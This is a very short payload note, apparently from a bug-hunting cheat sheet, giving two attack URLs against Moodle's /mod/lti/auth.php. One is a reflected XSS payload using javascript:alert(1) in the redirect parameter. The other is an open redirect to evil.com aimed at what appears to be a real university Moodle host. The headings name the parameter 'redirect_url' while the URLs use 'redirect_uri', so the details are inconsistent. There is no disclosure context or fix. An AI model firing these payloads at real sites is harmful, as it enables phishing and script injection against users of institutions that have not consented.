# Moodle

1. Reflected XSS in /mod/lti/auth.php via “redirect_url” parameter
```
https://target.com/mod/lti/auth.php?redirect_uri=javascript:alert(1)
```

2. Open redirect in /mod/lti/auth.php in “redirect_url” parameter

```
https://classroom.its.ac.id/mod/lti/auth.php?redirect_uri=https://evil.com
```